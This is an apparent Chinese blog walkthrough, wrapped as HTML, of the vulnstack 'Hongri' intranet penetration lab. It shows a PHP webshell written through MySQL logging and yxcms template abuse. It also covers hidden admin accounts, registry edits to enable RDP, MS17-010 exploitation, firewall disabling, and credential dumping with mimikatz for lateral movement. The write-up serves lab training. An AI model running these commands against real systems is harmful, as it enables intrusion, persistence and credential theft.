@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>红日内网渗透靶机（一） | Mlins</title><meta name="author" content="Mlins"><meta name="copyright" content="Mlins"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="再搭建靶机的时候很抓狂的是官网好像没给出密码，导致我一直无法登陆配置自定义IP，因为我并不想改变我nat网卡的网段 靶机本身也有问题  靶机搭建靶机地址下载：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F; 拓扑图如下所示：  下载完成后使用VMware打开，各个虚拟网卡的网段如下：  VMnet8：192.168.88.0&#x2F;24 VM">
+<meta property="og:type" content="article">
+<meta property="og:title" content="红日内网渗透靶机（一）">
+<meta property="og:url" content="http://blog.mlins.site/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="Mlins">
+<meta property="og:description" content="再搭建靶机的时候很抓狂的是官网好像没给出密码，导致我一直无法登陆配置自定义IP，因为我并不想改变我nat网卡的网段 靶机本身也有问题  靶机搭建靶机地址下载：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F; 拓扑图如下所示：  下载完成后使用VMware打开，各个虚拟网卡的网段如下：  VMnet8：192.168.88.0&#x2F;24 VM">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.mlins.site/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/image-20230510203336362.png">
+<meta property="article:published_time" content="2023-05-10T02:29:00.120Z">
+<meta property="article:modified_time" content="2023-05-16T04:25:43.365Z">
+<meta property="article:author" content="Mlins">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.mlins.site/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/image-20230510203336362.png"><link rel="shortcut icon" href="/img/20230404140956.png"><link rel="canonical" href="http://blog.mlins.site/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '红日内网渗透靶机（一）',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-16 12:25:43'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/20230404140956.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Mlins"><span class="site-name">Mlins</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">红日内网渗透靶机（一）</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">发表于</span><time datetime="2023-05-10T02:29:00.120Z" title="发表于 2023-05-10 10:29:00">2023-05-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="红日内网渗透靶机（一）"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><blockquote>
+<p>再搭建靶机的时候很抓狂的是官网好像没给出密码，导致我一直无法登陆配置自定义IP，因为我并不想改变我nat网卡的网段</p>
+<p>靶机本身也有问题</p>
+</blockquote>
+<h2 id="靶机搭建"><a href="#靶机搭建" class="headerlink" title="靶机搭建"></a>靶机搭建</h2><p>靶机地址下载：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<p>拓扑图如下所示：</p>
+<p><img src="image-20230510203336362.png" alt="image-20230510203336362"></p>
+<p>下载完成后使用<code>VMware</code>打开，各个虚拟网卡的网段如下：</p>
+<ul>
+<li>VMnet8：192.168.88.0&#x2F;24</li>
+<li>VMnet14：192.168.93.0&#x2F;24</li>
+</ul>
+<p>其中VMnet8网卡是我虚拟机默认的网段，VMnet14是额外添加的虚拟网卡，添加网卡时要注意修改一个配置，网段你们想怎么选都行，下图箭头所指默认时勾上的，要去掉，否则你电脑本机就能直接访问该网段。</p>
+<p><img src="image-20230510203711369.png" alt="image-20230510203711369"></p>
+<p>下图给出Windows7的网卡配置，其他的你们看图就知道选哪个网卡</p>
+<p><img src="image-20230510203928922.png" alt="image-20230510203928922"></p>
+<p>因为有些靶机的IP是配的静态的，故需要登陆进去修改，三个靶机密码都是<code>hongrisec@2019</code>，一开始我搞半天都不行，原网站也没给出静态的IP信息，后面去其他人的博客上才找到配置好网络环境（有些靶机会提示密码过期，重新改下就行）</p>
+<p>最后Win7内有个phpstudy运行不起来，需要单独运行mysql和apache服务</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入apache的bin目录运行此命令，将apache添加到服务</span></span><br><span class="line">httpd.exe <span class="literal">-k</span> install</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开服务管理界面，找到apache2.4，启动即可</span></span><br><span class="line">services.msc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打开mysql的bin目录运行以下命令即可</span></span><br><span class="line">mysqld <span class="literal">--defaults-file</span>=<span class="string">&quot;C:/phpStudy/mysql/my.ini&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>由于windows 7开启了防火墙，故无法采用ping扫描探测主机存活，但可疑使用以下命令进行探测：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用tcp的ack包探测主机是否存活</span></span><br><span class="line">nmap -sA -v 192.168.88.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230510104349915.png" alt="image-20230510104349915"></p>
+<p>通过排查可得目标服务器ip为<code>192.168.88.18</code>，对其进行端口扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取目标IP的端口开发以及端口服务信息</span></span><br><span class="line">nmap -sV -Pn -v 192.168.88.18</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230510111354316.png" alt="image-20230510111354316"></p>
+<p>可以发现开放了80端口和3306端口，进入80端口发现了PHP探针</p>
+<p><img src="image-20230510111453583.png" alt="image-20230510111453583"></p>
+<p>下面有个MYSQL连接检测，输入<code>root</code>,<code>root</code>连接成功</p>
+<p><img src="image-20230510111654785.png" alt="image-20230510111654785"></p>
+<p>使用御剑扫描网站目录发现存在<code>phpmyadmin</code>路径</p>
+<p><img src="image-20230510213428012.png" alt="image-20230510213428012"></p>
+<p>该界面有个测试数据库的连通性，直接用默认密码登陆数据库，目前有一个mysql可以尝试getshell，先记录下。</p>
+<p><img src="image-20230510111654785.png" alt="image-20230510213428012"></p>
+<p>登陆数据库后，发现有个<code>newyxcms</code>，说明该服务器可能还存在一个<code>yxcms</code>，尝试在路径后输入yxcms</p>
+<p><img src="image-20230510112523514.png" alt="image-20230510112523514"></p>
+<p>发现确实存在yxcms</p>
+<p><img src="image-20230510214330481.png" alt="image-20230510214330481"></p>
+<p>我们从数据库中查找管理员账号密码，密码已经被加过密了，尝试丢到在线解密网站进行解密</p>
+<p><img src="image-20230510214406960.png" alt="image-20230510214406960"></p>
+<p>从百度搜出yxcms的后台管理地址是<code>index.php?r=admin/index/login</code>，默认账号密码是<code>admin/123456</code>，登陆成功（一开始密码输错了会显示账号已锁定，是真的狗）</p>
+<p><img src="image-20230510215043171.png" alt="image-20230510215043171"></p>
+<p>登陆后通过后台界面的左下角可以看到<code>yxcms</code>的版本为<code>1.2.1</code>，这个版本看上去挺老的，也可能直接getshell，记录下。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="0x01-Mysql-Getshell"><a href="#0x01-Mysql-Getshell" class="headerlink" title="0x01. Mysql Getshell"></a>0x01. Mysql Getshell</h3><p>先看MYSQL是否支持导出一句话，可以知道无法进行通过导出一句话木马获得shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@secure_file_priv;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230510112853850.png" alt="image-20230510112853850"></p>
+<p>再尝试通过写日志getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 开启写日志</span><br><span class="line">set global general_log=&quot;ON&quot;;</span><br><span class="line"></span><br><span class="line"># 设置日志路径</span><br><span class="line">set global general_log_file=&#x27;C:/phpStudy/WWW/x.php&#x27;;</span><br><span class="line"></span><br><span class="line"># 修改完成后，最后查询是否修改成功</span><br><span class="line">SHOW VARIABLES LIKE &#x27;%general%&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20230510113445746.png" alt="image-20230510113445746"></p>
+<p>此时我们再通过查询语句往日志文件写入一句话木马，由于开启了<code>system</code>函数，那就直接用这个函数执行系统命令<br><img src="image-20230510113601455.png" alt="image-20230510113601455"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]);?&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>访问<code>http://192.168.88.18/x.php?cmd=whoami</code>，可知命令已执行成功</p>
+<p><img src="image-20230510114004371.png" alt="image-20230510114004371"></p>
+<h3 id="0x02-Yxcms命令执行Getshell"><a href="#0x02-Yxcms命令执行Getshell" class="headerlink" title="0x02. Yxcms命令执行Getshell"></a>0x02. Yxcms命令执行Getshell</h3><p><code>yxcms 1.4.7</code>版本存在目录遍历和代码执行等一系列漏洞，尝试在当前版本是否适用。</p>
+<p>输入网址<code>http://192.168.88.18/yxcms/index.php?r=admin/files/index&amp;dirget=../../</code>，发现确实存在目录遍历漏洞</p>
+<p><img src="image-20230511075641200.png" alt="image-20230511075641200"></p>
+<p>观察下目录结构发现存在<code>kindeditor</code>编辑器</p>
+<p><img src="image-20230510221032023.png" alt="image-20230510221032023"></p>
+<p>访问<code>http://192.168.88.18/yxcms/public/kindeditor</code>，发现网站本身还存在目录遍历漏洞，不过编辑器是没法利用了</p>
+<p><img src="image-20230511080345219.png" alt="image-20230511080345219"></p>
+<p>继续转到前台模板，可以看到都是php文件，并且可以编辑</p>
+<p><img src="image-20230511080500510.png" alt="image-20230511080500510"></p>
+<p>经观察，选择在<code>layout.php</code>一句话木马最为方便，因为这种版权信息不用进后端就能看到</p>
+<p><img src="image-20230511085730208.png" alt="image-20230511085730208"></p>
+<p>使用蚁剑连接成功</p>
+<p><img src="image-20230511085850816.png" alt="image-20230511085850816"></p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>使用蚁剑的虚拟终端查看目标服务器的进程，通过检测没有发现杀软</p>
+<p><img src="image-20230511090326941.png" alt="image-20230511090326941"></p>
+<p>本来想使用payload<code>reverse_https</code>，但无论怎么尝试都没动静，<code>Wireshark</code>也没有对应的流量，无奈只能换成<code>reverse_http</code>，生成一个<code>powershell</code>命令的后门，直接在蚁剑的虚拟终端上执行，执行成功上线cs</p>
+<p>紧接着创建一个smb监听器，然后将当前的会话派生的smb监听器上</p>
+<p><img src="image-20230515143506013.png" alt="image-20230515143506013"></p>
+<p>然后使用最新的会话做一系列操作，获取systeminfo信息</p>
+<p><img src="image-20230511092257229.png" alt="image-20230511092257229"></p>
+<p>运行<code>mimikatiz</code>获取目标服务器的密码</p>
+<p><img src="image-20230510130103987.png" alt="image-20230510130103987"></p>
+<p>一些常用方法，记录下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 以下创建的用户net user无法查看，但可通过lusrmgr.msc或注册表进行查看</span></span><br><span class="line"><span class="comment">## 创建隐藏用户</span></span><br><span class="line">net user admin<span class="variable">$</span> <span class="number">123456</span> /add</span><br><span class="line"><span class="comment">## 将隐藏账号设为管理员</span></span><br><span class="line">net localgroup administrators admin<span class="variable">$</span> /add</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以创建克隆账号，需要操作注册表，且只能通过注册表查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"><span class="comment"># 关闭3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">11111111</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment"># msf中post/windows/manage/migrate模块的进程注入</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Windows schtasks命令创建计划任务</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自启动</span></span><br><span class="line"><span class="comment">## HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\run</span></span><br><span class="line"><span class="comment">## HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line"><span class="comment">## HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</span></span><br><span class="line"><span class="comment">## C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shift后门</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>查看网卡信息发现有内网网段<code>192.168.93.0/24</code></p>
+<p><img src="image-20230510130637026.png" alt="image-20230510130637026"></p>
+<p>查看当前域的名字但发生系统错误，表示该网络存在域，但不是域成员</p>
+<p><img src="image-20230511094140485.png" alt="image-20230511094140485"></p>
+<p>通过<code>net view</code>可以查看当前域的计算机列表，下图可知<code>192.168.93.130</code>是域控服务器</p>
+<p><img src="image-20230510130303430.png" alt="image-20230510130303430"></p>
+<p>上传fscan，对内网进行扫描</p>
+<ul>
+<li><p>端口开放情况：</p>
+<p><img src="image-20230511095110910.png" alt="image-20230511095110910"></p>
+</li>
+<li><p>漏洞扫描情况（先记录）</p>
+<ul>
+<li>129和130可能存在ms17-010漏洞</li>
+<li>129存在ftp匿名登陆</li>
+<li>129的8099端口存在一个web页面</li>
+<li>130存在一个IIS7的网站</li>
+</ul>
+<p><img src="image-20230511095155788.png" alt="image-20230511095155788"></p>
+</li>
+</ul>
+<p>将会话转移到msf中，并通过命令<code>run autoroute</code>自动添加内网路由</p>
+<p><img src="image-20230516081014507.png" alt="image-20230516081014507"></p>
+<p>使用<code>exploit/windows/smb/ms17_010_psexec</code>模块获取该域控服务器的权限</p>
+<blockquote>
+<p>由于在内网环境下，只能使用bind类型的payload，采用反连的payload会导致服务器无法访问到我们的攻击机</p>
+</blockquote>
+<p><img src="image-20230515154629596.png" alt="image-20230515154629596"></p>
+<p>利用成功但是无法创建会话，那再使用<code>auxiliary/admin/smb/ms17_010_command</code>模块执行系统命令<code>whoami</code>，如果执行成功则说明该域控开了防火墙。</p>
+<p><img src="image-20230515154413503.png" alt="image-20230515154413503"></p>
+<p>接下来运行命令<code>netsh firewall set opmode disable</code>关闭防火墙</p>
+<p><img src="image-20230515161034595.png" alt="image-20230515161034595"></p>
+<p>再重新使用<code>psexec</code>模块，记得更换其他端口，然后就获取到域控服务器的会话</p>
+<p><img src="image-20230515161056785.png" alt="image-20230515161056785"></p>
+<p><img src="image-20230515161212555.png" alt="image-20230515161212555"></p>
+<p>导入<code>kiwi</code>（旧版本的<code>mimikatz</code>）,由于<code>kiwi</code>默认加载的是32位，而目标服务器是64位，故需要将<code>meterpreter</code>进程迁移到64位进程中才能查看系统明文。</p>
+<p><img src="image-20230515162630855.png" alt="image-20230515162630855"></p>
+<p>查看目标服务器的进程列表</p>
+<p><img src="image-20230515162615961.png" alt="image-20230515162615961"></p>
+<p>选择一个64位进程，使用命令<code>migrate pid</code>进行进程迁移</p>
+<p><img src="image-20230516082452527.png" alt="image-20230516082452527"></p>
+<p>再使用命令<code>creds_all</code>获取所有凭证信息</p>
+<p><img src="image-20230515162531254.png" alt="image-20230515162531254"></p>
+<p>获取到账号密码后，在cs中<code>jump-&gt;psexec</code>，然后输入密码进行横向移动</p>
+<p><img src="image-20230515162758725.png" alt="image-20230515162758725"></p>
+<p>域控服务器成功上线cs，经排查域控服务器也未存在杀软</p>
+<p><img src="image-20230516075424417.png" alt="image-20230516075424417"></p>
+<p>在cs上对域控服务器抓取</p>
+<p><img src="image-20230516080746117.png" alt="image-20230516080746117"></p>
+<p>同理让其他域成员主机上线cs</p>
+<p><img src="image-20230510163410929.png" alt="image-20230516080746117"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://blog.mlins.site">Mlins</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://blog.mlins.site/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/">http://blog.mlins.site/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.mlins.site" target="_blank">Mlins</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/image-20230510203336362.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/05/06/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/" title="Windows应急响应笔记"><img class="cover" src="/2023/05/06/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/image-20230509161145970.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Windows应急响应笔记</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/20230404140956.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Mlins</div><div class="author-info__description">不管往哪走，都是往前走。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/smlins"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">靶机搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-Mysql-Getshell"><span class="toc-number">3.1.</span> <span class="toc-text">0x01. Mysql Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Yxcms%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CGetshell"><span class="toc-number">3.2.</span> <span class="toc-text">0x02. Yxcms命令执行Getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">4.</span> <span class="toc-text">权限维持</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">5.</span> <span class="toc-text">横向移动</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/" title="红日内网渗透靶机（一）"><img src="/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/image-20230510203336362.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日内网渗透靶机（一）"/></a><div class="content"><a class="title" href="/2023/05/10/%E7%BA%A2%E6%97%A5%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E6%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89/" title="红日内网渗透靶机（一）">红日内网渗透靶机（一）</a><time datetime="2023-05-10T02:29:00.120Z" title="发表于 2023-05-10 10:29:00">2023-05-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/06/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0/" title="Windows应急响应笔记"><img 